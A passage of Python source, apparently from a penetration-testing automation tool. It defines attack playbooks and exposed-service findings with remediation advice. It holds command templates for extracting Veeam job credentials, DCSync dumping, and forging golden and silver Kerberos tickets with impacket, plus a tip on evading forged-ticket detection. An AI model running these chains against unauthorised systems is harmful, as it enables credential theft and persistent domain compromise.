                  "Manager answers on 9443, the backup service on 9401; hostnames "
                  "and SMB shares usually give it away too."),
            _step(2, "Known-exploit sweep", "start", "nuclei_cve",
                  [], ["cve_hit"],
                  "nuclei_cve with tags cve,kev,veeam matches the Veeam CVE set: "
                  "CVE-2023-27532 (unauth credential disclosure), CVE-2024-40711 and "
                  "successors (RCE as SYSTEM via the backup service).",
                  args={"tags": "cve,kev,veeam"},
                  severity="Critical", cvss="9.8",
                  finding_title="Backup Server Vulnerable to a Known Exploit",
                  impact="Exploiting the backup server yields every credential stored "
                         "for backup jobs — typically vCenter, SQL and domain "
                         "administrator — plus access to all backup data (ransomware "
                         "crews target it first for exactly this reason).",
                  recommendation="Patch Veeam to the current build, isolate backup "
                         "management ports on a dedicated VLAN, and use "
                         "least-privilege gMSA accounts for backup jobs."),
            _step(3, "Recover stored job credentials", "have credential", "netexec_module",
                  ["credential"], ["credential"],
                  "netexec mssql -M veeam (protocol=mssql, module=veeam): Veeam keeps "
                  "its credential store in a local MSSQL instance — the module "
                  "extracts and decrypts every stored job credential.",
                  args={"protocol": "mssql", "module": "veeam"},
                  severity="High", cvss="8.1",
                  finding_title="Backup Credential Store Exposed",
                  impact="Credentials recovered from the backup database are commonly "
                         "domain administrator or vCenter root — one MSSQL query "
                         "becomes full domain compromise.",
                  recommendation="Rotate every credential stored in the backup server, "
                         "restrict the Veeam MSSQL instance to localhost, and audit "
                         "logons to the backup database."),
            _step(4, "Decrypt offline", "start",
                  "veeam-decrypt / Veeam-Get-Creds against an exported configuration database",
                  ["credential"], ["admin"],
                  "With a copy of the Veeam configuration database (or a backup of "
                  "it), decrypt the stored credentials offline with the published "
                  "DPAPI-based tooling.", "final"),
        ],
    },
{
        "id": "ad-persistence",
        "name": "Post-dominance persistence: golden & silver tickets",
        "summary": "After domain dominance, forge Kerberos tickets from the krbtgt "
                   "and service hashes — access that survives user password resets "
                   "until krbtgt is rotated twice.",
        "match": {"any_ports": [88, 445], "signals": ["username"]},
        "run": {},
        "steps": [
            _step(1, "DCSync for the krbtgt hash", "have credential", "secretsdump",
                  ["credential"], ["hash", "flag"],
                  "secretsdump -just-dc against the DC with a DA-equivalent account "
                  "replicates every domain hash — the krbtgt hash is the golden-"
                  "ticket key.",
                  severity="Critical", cvss="9.8",
                  finding_title="Domain Credential Replication (DCSync / NTDS Dump)",
                  impact="Replication rights expose every domain credential "
                         "including krbtgt — the material for golden tickets that "
                         "persist after individual password resets.",
                  recommendation="Restrict DS-Replication-Get-Changes to DC computer "
                         "accounts, alert on replication from non-DCs (event 4662), "
                         "and rotate krbtgt twice after any suspected compromise."),
            _step(2, "Harvest the domain SID", "have credential", "lookupsid",
                  ["credential"], ["userlist", "domain"],
                  "lookupsid resolves the domain SID (and the full RID/user list) — "
                  "the SID is a required ingredient for forged tickets."),
            _step(3, "Forge a golden ticket", "have hashes",
                  "ticketer -nthash <krbtgt> -domain-sid <sid> -domain <fqdn> Administrator",
                  ["hash", "domain"], ["ticket", "admin"],
                  "ticketer (impacket) forges a TGT for any user from the krbtgt "
                  "hash + domain SID — valid for years and invisible to user "
                  "password resets. Export as KRB5CCNAME and use any impacket -k "
                  "tool. Consider a diamond ticket (genuine TGT re-encrypted) where "
                  "defenders watch for forged-TGT anomalies."),
            _step(4, "Silver tickets for services", "have hashes",
                  "ticketer -nthash <service-account-hash> -spn cifs/<host.fqdn> <user> (no DC contact)",
                  ["hash"], ["ticket"],
                  "A service/machine account hash forges a silver ticket for that "
                  "service with NO domain-controller traffic — near-invisible. "
                  "Detection: monitor for service tickets with abnormal lifetimes "
                  "and PAC anomalies; rotate service accounts and reset krbtgt "
                  "twice to evict forgers.", "final"),
        ],
    },
_finding("redis-exposed", "Redis Exposed Without Authentication", "High", "7.5",
             "A Redis instance is reachable on the network (6379) and answers "
             "without authentication.",
             "The dataset (cached secrets, sessions) is readable and writable; "
             "unauthenticated Redis is a known RCE path (module load, SSH key / "
             "cron writes, master-replica abuse).",
             "Require authentication (requirepass / ACLs), bind to protected "
             "interfaces, disable CONFIG/MODULE/DEBUG commands.",
             any_ports=[6379], evidence_tools=["redis_check"]),
_finding("docker-api-exposed", "Docker Daemon API Exposed (Unauthenticated)",
             "Critical", "9.8",
             "The Docker daemon API is reachable over plain HTTP (2375) and "
             "answers /version without authentication.",
             "The unauthenticated Docker API is root-equivalent: an attacker can "
             "start a privileged container mounting the host filesystem — full "
             "compromise of the host and all its containers.",
             "Never expose tcp/2375; require TLS client-certificate auth (2376) or "
             "SSH access, and firewall the management socket.",
             any_ports=[2375], evidence_tools=["docker_api_check"]),
_finding("elasticsearch-exposed", "Elasticsearch Exposed Without Authentication",
             "High", "7.5",
             "An Elasticsearch cluster is reachable (9200) and lists its indices "
             "without authentication.",
             "All indexed data (logs, user records, documents) is exposed, and "
             "indices can be modified or deleted.",
             "Enable X-Pack security (authentication + TLS), bind to internal "
             "interfaces, and place behind an authenticated proxy.",
             any_ports=[9200], evidence_tools=["elastic_check"]),
_finding("mongodb-exposed", "MongoDB Exposed Without Authentication",
             "High", "7.5",
             "A MongoDB instance is reachable (27017); if authentication is "
             "disabled, databases are listable and readable by anyone.",
             "Unauthenticated MongoDB instances are routinely found by mass "
             "scanners and held to ransom; full data exposure and deletion risk.",
             "Enable access control (security.authorization), bind to localhost/"
             "protected VLANs, and rotate any exposed data credentials.",
             any_ports=[27017], evidence_tools=["mongodb_check"]),
_finding("memcached-exposed", "memcached Exposed Without Authentication",
             "Medium", "5.3",
             "A memcached service is reachable (11211) and answers 'stats' "
             "without authentication.",
             "Cached application data (sessions, tokens, objects) is readable; "
             "UDP-exposed memcached is abused for DDoS amplification.",
             "Bind to localhost/internal interfaces, require SASL auth where "
             "supported, and disable UDP (-U 0).",
             any_ports=[11211], evidence_tools=["memcached_check"]),
_finding("nfs-exports", "NFS Export Accessible", "Medium", "6.5",
             "The host exports NFS filesystems (2049) that are listable from the "
             "network (showmount).",
             "Readable exports leak configuration, keys and backups; writable "
             "exports with no_root_squash allow code execution as root.",
             "Restrict exports to specific hosts, enable root_squash, and require "
             "NFSv4/Kerberos authentication.",
             any_ports=[2049], evidence_tools=["nfs_shares", "rpcinfo"]),
_finding("snmp-public", "SNMP Readable with a Weak Community String",
             "Medium", "5.3",
             "SNMP (161/udp) answers a default/weak community string such as "
             "'public'.",
             "Device configuration, processes, users and sometimes credentials are "
             "readable; a write community allows device reconfiguration.",
             "Use SNMPv3 with auth+privacy, change default communities, and "
             "ACL-restrict SNMP to monitoring hosts.",
             any_ports=[161], evidence_tools=["snmp_walk", "onesixtyone"]),
_finding("telnet-cleartext", "Telnet Service Exposed (Cleartext)", "Medium", "6.5",
             "A Telnet service is reachable (23). Telnet transmits credentials and "
             "session data in cleartext.",
             "On-path attackers can sniff credentials and hijack sessions; Telnet "
             "services are also frequently protected only by weak/default logins.",
             "Replace Telnet with SSH; if Telnet is unavoidable, restrict it to a "
             "dedicated management network.",
             any_ports=[23]),
_finding("vnc-exposed", "VNC Remote Desktop Exposed", "Medium", "6.5",
             "A VNC server is reachable (5900+). VNC is often protected by a short "
             "password only, and some builds offer no authentication at all.",
             "VNC gives interactive GUI access to the host; weak or absent VNC "
             "passwords are a common intrusion path.",
             "Restrict VNC to SSH-tunnelled/localhost access, require strong "
             "passwords + encryption, and prefer managed remote-access solutions.",
             any_ports=[5900, 5901]),
_finding("ike-aggressive-psk", "IPsec IKE Aggressive Mode (Crackable PSK)",
             "Medium", "5.9",
             "The VPN gateway (500/udp) answers IKE aggressive mode, exposing a "
             "crackable group pre-shared-key hash to anyone who asks.",
             "A cracked group PSK plus any valid username grants VPN access; group "
             "PSKs are often weak and reused across sites.",
             "Disable aggressive mode (main mode only), prefer certificate "
             "authentication, and enforce strong unique PSKs.",
             any_ports=[500], evidence_tools=["ike_scan", "psk_crack"]),
_finding("smtp-open-relay", "SMTP Open Relay", "Medium", "5.3",
             "The mail server (25/587) relays mail for arbitrary senders and "
             "domains.",
             "An open relay enables spoofed internal email (phishing that appears "
             "to come from a trusted domain) and abuse of the server for outbound "
             "spam.",
             "Disable open relaying, require authentication for submission, and "
             "restrict relaying to known hosts/networks.",
             any_ports=[25, 587], evidence_tools=["smtp_openrelay"]),
_finding("ldap-anon-bind", "LDAP Anonymous Bind Enabled", "Medium", "5.3",
             "The directory (389/636/3268) answers anonymous LDAP binds, exposing "
             "the directory tree without credentials.",
             "An anonymous bind lets an unauthenticated attacker enumerate users, "
             "groups, computers and often descriptions containing passwords — the "
             "reconnaissance foundation for spraying and Kerberoasting.",
             "Disable anonymous binds (dsHeuristics on AD, disallow bind_anon on "
             "OpenLDAP) and monitor for unauthenticated LDAP queries.",
             any_ports=[389, 636, 3268], evidence_tools=["ldapsearch_anon"]),
_finding("dns-zone-transfer", "DNS Zone Transfer (AXFR) Allowed", "Medium", "5.3",
             "The DNS server (53) answers zone-transfer requests from arbitrary "
             "clients.",
             "AXFR hands an attacker the complete zone: every hostname, IP and "
             "service record — a full network map for targeting, including internal "
             "hosts never meant to be public.",
             "Restrict zone transfers to authorised secondary servers "
             "(allow-transfer / TSIG) and log AXFR attempts.",
             any_ports=[53], evidence_tools=["dns_recon"]),
]


def _path(log_dir) -> Path:
    return Path(log_dir) / "playbooks.json"


def load(log_dir) -> list:
    """Return the stored playbooks, seeding the defaults on first use."""
    p = _path(log_dir)
    try:
        data = json.loads(p.read_text(encoding="utf-8"))
        if isinstance(data, list) and data:
            return _migrate(log_dir, data)
    except (FileNotFoundError, json.JSONDecodeError):
        pass
    save(log_dir, copy.deepcopy(DEFAULT_PLAYBOOKS))
    return copy.deepcopy(DEFAULT_PLAYBOOKS)


def _migrate(log_dir, data: list) -> list:
    """Upgrade older stored playbooks in place.

    Built-in playbooks evolve (the AD chain became a tool-per-step model; steps
    gained args, finding fields, and accurate consumes/produces). Each built-in is
    stamped with ``_v``; when the stored copy predates the current
    ``_BUILTIN_VERSION`` (or is the old AD-chain shape) it is re-seeded from the
    default. User-created playbooks are never re-seeded — only back-filled with any
    missing step keys so the editor can show them.
    """
    changed = False
    defaults = {pb["id"]: pb for pb in DEFAULT_PLAYBOOKS}
    for i, pb in enumerate(data):
        dpb = defaults.get(pb.get("id"))
        if dpb is not None:
            run = pb.get("run") or {}
            old_shape = bool(run.get("sequence")) or any(
                not _runnable_tool(s.get("tool", "")) for s in pb.get("steps", []))
            if pb.get("_v") != _BUILTIN_VERSION or old_shape:
                data[i] = copy.deepcopy(dpb)
                data[i]["_v"] = _BUILTIN_VERSION
                changed = True
                continue
        for st in pb.get("steps", []):        # user-created / already-current
            if "args" not in st:
                st["args"] = {}
                changed = True
            for k in ("severity", "cvss", "impact", "recommendation", "finding_title"):
                if k not in st:
                    st[k] = ""
                    changed = True
    # Add any built-in playbook that isn't stored yet (new defaults on upgrade),
    # preserving the operator's existing order and customisations.
    have = {pb.get("id") for pb in data}
    for dpb in DEFAULT_PLAYBOOKS:
        if dpb["id"] not in have:
            new = copy.deepcopy(dpb)
            new["_v"] = _BUILTIN_VERSION
            data.append(new)
            changed = True
    if changed:
        save(log_dir, data)
    return data


def save(log_dir, playbooks: list) -> None:
    p = _path(log_dir)
    p.parent.mkdir(parents=True, exist_ok=True)
    tmp = p.with_suffix(".tmp")
    tmp.write_text(json.dumps(playbooks, indent=2), encoding="utf-8")
    tmp.replace(p)


def reset(log_dir) -> list:
    save(log_dir, copy.deepcopy(DEFAULT_PLAYBOOKS))
    return copy.deepcopy(DEFAULT_PLAYBOOKS)


def _open_ports(services: list) -> dict:
    """port -> [hosts] from the service matrix (each service row has ports+hosts)."""
    ports: dict[int, list] = {}
    for s in services:
        hosts = [h["host"] for h in s.get("hosts", [])]
        for p in s.get("ports", []):
            ports.setdefault(int(p), [])
            for h in hosts:
                if h not in ports[int(p)]:
                    ports[int(p)].append(h)
    return ports


def _host_open_ports(entry: dict) -> set:
    return {p["port"] for p in entry.get("ports", {}).values()
            if p.get("state") == "open"}


def matching_hosts(pb: dict, hosts: dict) -> list:
    """Hosts a playbook applies to: those exposing one of its ports AND whose
    facts equal every required host_fact (that's what makes a finding per-host)."""
    match = pb.get("match", {}) or {}
    any_ports = set(int(p) for p in (match.get("any_ports") or []))
    host_facts = match.get("host_facts") or {}
    out = []
    for h, entry in sorted((hosts or {}).items()):
        ports = _host_open_ports(entry)
        if any_ports and not (any_ports & ports):
            continue
        hf = entry.get("facts", {})
        if any(str(hf.get(k)) != str(v) for k, v in host_facts.items()):
            continue
        out.append(h)
    return out


def evaluate(pb: dict, hosts: dict, services: list, facts: dict) -> dict:
    """Explain whether *pb* matches the current scan results.

    Returns {matched, matched_hosts, reasons:[{rule,matched,hits}]}. A playbook
    matches when a required port is open (and, for finding playbooks, the required
    host facts hold on that host). Signals add context.
    """
    ports = _open_ports(services)
    reasons = []
    match = pb.get("match", {}) or {}
    host_facts = match.get("host_facts") or {}

    any_ports = match.get("any_ports") or []
    port_matched = None
    if any_ports:
        hits = [f"{h}:{p}" for p in any_ports for h in ports.get(int(p), [])]
        port_matched = bool(hits)
        reasons.append({"rule": f"any open port in {any_ports}",
                        "matched": port_matched, "hits": sorted(hits)})

    matched_hosts = matching_hosts(pb, hosts)
    for k, v in host_facts.items():
        hits = [h for h in matched_hosts]
        reasons.append({"rule": f"host fact {k} = {v}",
                        "matched": bool(matched_hosts), "hits": hits})

    for sig in match.get("signals") or []:
        present = bool(facts.get(sig)) or (sig == "username" and (
            facts.get("username") or facts.get("nthash")))
        reasons.append({"rule": f"fact signal '{sig}'",
                        "matched": bool(present),
                        "hits": [f"{sig}={facts.get(sig)}"] if facts.get(sig) else []})

    if host_facts:
        matched = bool(matched_hosts)
    elif port_matched is not None:
        matched = port_matched
    else:
        matched = True
    return {"matched": matched, "matched_hosts": matched_hosts, "reasons": reasons}


def annotate(hosts: dict, services: list, facts: dict, log_dir) -> list:
    out = []
    for pb in load(log_dir):
        out.append({**pb, "evaluation": evaluate(pb, hosts, services, facts)})
    return out
